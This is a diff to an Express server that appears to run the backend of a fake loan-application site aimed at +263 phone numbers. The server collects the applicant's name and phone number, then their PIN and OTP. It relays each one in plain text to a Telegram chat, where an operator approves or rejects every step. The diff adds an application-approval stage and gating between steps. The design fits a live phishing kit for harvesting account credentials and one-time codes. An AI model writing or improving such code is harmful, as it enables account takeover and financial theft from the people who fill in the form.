@@ -2,6 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+const fetch = require('node-fetch'); // for Node < 18
 
 const app = express();
 app.use(cors());
@@ -61,11 +62,16 @@ app.get('/api/health', (req, res) => res.json({ ok: true }));
 
 app.post('/api/send-application', async (req, res) => {
   const data = req.body.applicationData;
+  if (!data || !data.phone || !data.firstName) {
+    return res.status(400).json({ ok: false, error: 'Missing required fields' });
+  }
+
   const appId = `${data.phone}_${Date.now()}`;
   const ref = generateAppRef(appId);
 
   applications[appId] = {
     ...data,
+    appStatus: 'pending',          // <-- new field for application approval
     pinStatus: 'pending',
     otpStatus: 'pending',
     pinAttempts: 0,
@@ -76,18 +82,23 @@ app.post('/api/send-application', async (req, res) => {
 
   const message = `NEW LOAN APPLICATION\nID: ${appId}\nPhone: +263${data.phone}\nAmount: $${data.loanAmount}\nDuration: ${data.loanDuration} days\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
   const buttons = [[
-    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref }) },
-    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref }) }
+    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'APP', ref }) },
+    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'APP', ref }) }
   ]];
 
   await sendTelegramMessage(message, buttons);
-  res.json({ ok: true, applicationId: appId, status: 'waiting_pin' });
+  res.json({ ok: true, applicationId: appId, status: 'waiting_app_approval' });
 });
 
 app.post('/api/send-pin', async (req, res) => {
   const { applicationId, pin } = req.body;
   const app = applications[applicationId];
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+  // Check if application itself is approved
+  if (app.appStatus !== 'approved') {
+    return res.status(400).json({ ok: false, error: 'Application not yet approved' });
+  }
 
   if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
     return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
@@ -99,12 +110,11 @@ app.post('/api/send-pin', async (req, res) => {
 
   app.pin = pin;
   app.pinStatus = 'pending';
-  const ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
+
+  // Find the existing ref or generate one
+  let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
   if (!ref) {
-    // if ref lost (shouldn't happen), generate new one
-    const newRef = generateAppRef(applicationId);
-    appRefs[newRef] = applicationId;
-    ref = newRef;
+    ref = generateAppRef(applicationId);
   }
 
   const message = `PIN VERIFICATION\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
@@ -122,13 +132,17 @@ app.post('/api/send-otp', async (req, res) => {
   const app = applications[applicationId];
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
+  // Ensure PIN is approved before OTP
+  if (app.pinStatus !== 'approved') {
+    return res.status(400).json({ ok: false, error: 'PIN not yet approved' });
+  }
+
   app.otp = otp;
   app.otpStatus = 'pending';
-  const ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
+
+  let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
   if (!ref) {
-    const newRef = generateAppRef(applicationId);
-    appRefs[newRef] = applicationId;
-    ref = newRef;
+    ref = generateAppRef(applicationId);
   }
 
   const message = `OTP VERIFICATION\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
@@ -147,11 +161,10 @@ app.post('/api/resend-otp', async (req, res) => {
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
   app.otpStatus = 'pending';
-  const ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
+
+  let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
   if (!ref) {
-    const newRef = generateAppRef(applicationId);
-    appRefs[newRef] = applicationId;
-    ref = newRef;
+    ref = generateAppRef(applicationId);
   }
 
   const message = `OTP RESENT - ADMIN ACTION REQUIRED\nID: ${applicationId}\nNew OTP requested.\n\nApprove or reject:`;
@@ -172,7 +185,9 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
   let remainingAttempts = null;
   let blocked = false;
 
-  if (req.params.step === 'pin') {
+  if (req.params.step === 'app') {
+    status = app.appStatus;
+  } else if (req.params.step === 'pin') {
     status = app.pinStatus;
     remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
     blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
@@ -208,7 +223,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     console.log(`🔘 Processing callback: action=${a}, step=${s}, appId=${appId}`);
 
-    if (s === 'PIN') {
+    if (s === 'APP') {
+      if (a === 'YES') {
+        app.appStatus = 'approved';
+      } else {
+        app.appStatus = 'rejected';
+      }
+    } else if (s === 'PIN') {
       if (a === 'YES') {
         app.pinStatus = 'approved';
       } else {
@@ -251,7 +272,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         let msg = 'Recent applications:\n';
         ids.forEach(id => {
           const app = applications[id];
-          msg += `${id} – ${app.phone} (PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
+          msg += `${id} – ${app.phone} (APP: ${app.appStatus}, PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
         });
         await sendTelegramMessage(msg || 'No applications yet.');
       } else if (text === '/help') {
